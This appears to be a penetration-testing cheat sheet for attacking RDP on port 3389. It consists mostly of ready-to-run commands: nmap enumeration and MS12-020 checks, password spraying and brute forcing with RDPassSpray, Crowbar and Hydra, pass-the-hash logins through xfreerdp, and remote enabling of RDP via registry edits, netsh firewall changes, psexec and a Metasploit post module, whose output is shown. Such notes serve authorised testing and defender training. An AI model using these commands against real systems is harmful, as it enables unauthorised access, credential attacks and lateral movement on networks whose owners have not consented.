---
description: >-
  Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft
  which provides a user with a graphical interface to connect to another
  computer over a network connection.
---

# 3389 - RDP

## Enumeration

### Nmap

Find encryption type:

```
nmap -p 3389 --script rdp-enum-encryption <target>
```

Enumerates information from remote RDP services with CredSSP (NLA) authentication enabled:

```
nmap -p 3389 --script rdp-ntlm-info <target>
```

Check if vulnerable to MS12-020:

```
nmap -sV --script=rdp-vuln-ms12-020 -p 3389 <target>
```

## Brute force access

### RDPassSpray

RDPassSpary is a python tool to perform password spray attack in a Microsoft domain environment.

Link: [https://github.com/xFreed0m/RDPassSpray](https://github.com/xFreed0m/RDPassSpray)

Usage:

```
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
```

### Crowbar

Link: [https://github.com/galkan/crowbar](https://github.com/galkan/crowbar)

```
./crowbar.py -b rdp -s 10.xx.xx.xx/32 -u sectest@TESTDOMAIN.local -C /root/Desktop/tests/hyda_rdp/rock.txt
```

### Hydra:

```
hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.1.1
```

## Tools to connect to RDP

### rdesktop

Remote Desktop for windows with share and 85% screen:&#x20;

```
rdesktop -u username -p password -g 85% -r disk:share=/tmp/share 10.10.10.10
```

### xfreerdp

**Login using hash:**

```
Xfreerdp /u:admin /d:win2012 /pth:[hash] /v:192.168.0.1
```

When CredSSP is required:&#x20;

```
xfreerdp --plugin rdpdr --data disk:home:/tmp -- -f -u john 192.168.0.44
```

To exit press 'ctrl+alt+enter'&#x20;

## Enable RDP

### Enable rdp from registry

```
reg add "\\host\HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Enable from netsh

```
netsh firewall set service remoteadmin enable 
netsh firewall set service remotedesktop enable
```

### Enable using psexec

```
psexec \\host reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
/usr/local/bin/psexec.py user:password@10.0.0.1 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## Enable using metasploit

```
use post/windows/manage/enable_rdp
msf5 post(windows/manage/enable_rdp) > run

[*] Enabling Remote Desktop
[*] 	RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[+] 	RDP Service Started
[*] 	Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20200520112125_default_10.50.30.103_host.windows.cle_789147.txt
[*] Post module execution completed
msf5 post(windows/manage/enable_rdp) >
```
